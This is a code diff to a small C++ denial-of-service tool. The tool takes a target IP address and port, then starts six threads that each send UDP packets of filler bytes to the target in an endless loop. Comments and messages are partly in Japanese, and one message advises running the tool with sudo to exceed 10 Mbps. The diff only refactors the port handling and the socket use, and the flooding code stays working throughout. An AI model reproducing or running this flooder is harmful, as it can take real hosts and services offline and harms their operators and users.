@@ -16,10 +16,11 @@ const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";
+int port;
 
-void attack(char* str, int port)
+void attack(char* str)
 {
-    int soc, soc2;
+    int soc;
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -32,15 +33,13 @@ void attack(char* str, int port)
     while (true) {
         try {
             //ソケット生成
-            soc = soc2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+            soc = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
             //データ送信
             sendto(soc, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
-            sendto(soc2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
             //ソケットを閉じる
             (*F_close)(soc);
-            (*F_close)(soc2);
         }
         catch (...) {
             perror("Error ");
@@ -49,9 +48,9 @@ void attack(char* str, int port)
     }
 }
 
-void attack2(char* str, int port)
+void attack2(char* str)
 {
-    int sock, sock2;
+    int sock;
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -64,15 +63,13 @@ void attack2(char* str, int port)
     while (true) {
         try {
             //ソケット生成
-            sock = sock2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+            sock = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
             //データ送信
             sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
-            sendto(sock2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
             //ソケットを閉じる
             (*F_close)(sock);
-            (*F_close)(sock2);
         }
         catch (...) {
             perror("Error ");
@@ -81,9 +78,9 @@ void attack2(char* str, int port)
     }
 }
 
-void attack3(char* str, int port)
+void attack3(char* str)
 {
-    int socks, socks2;
+    int socks;
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -96,15 +93,13 @@ void attack3(char* str, int port)
     while (true) {
         try {
             //ソケット生成
-            socks = socks2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+            socks = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
             //データ送信
             sendto(socks, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
-            sendto(socks2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
             //ソケットを閉じる
             (*F_close)(socks);
-            (*F_close)(socks2);
         }
         catch (...) {
             perror("Error ");
@@ -119,10 +114,8 @@ int main(int argc, char* argv[])
         printf("\n管理者権限じゃないと10Mbps超えなかったから\nsudoを付けて実行をしてね。\n\n");
         return -1;
     }
-
-  　struct hostent* he;
+    struct hostent* he;
     char* str = nullptr;
-    int port;
 
     if (argc < 3) {
         printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
@@ -140,12 +133,12 @@ int main(int argc, char* argv[])
 
     printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);
 
-    std::thread t1(attack, str, port);
-    std::thread t2(attack, str, port);
-    std::thread t3(attack2, str, port);
-    std::thread t4(attack2, str, port);
-    std::thread t5(attack3, str, port);
-    std::thread t6(attack3, str, port);
+    std::thread t1(attack, str);
+    std::thread t2(attack, str);
+    std::thread t3(attack2, str);
+    std::thread t4(attack2, str);
+    std::thread t5(attack3, str);
+    std::thread t6(attack3, str);
 
     t1.join();
     t2.join();
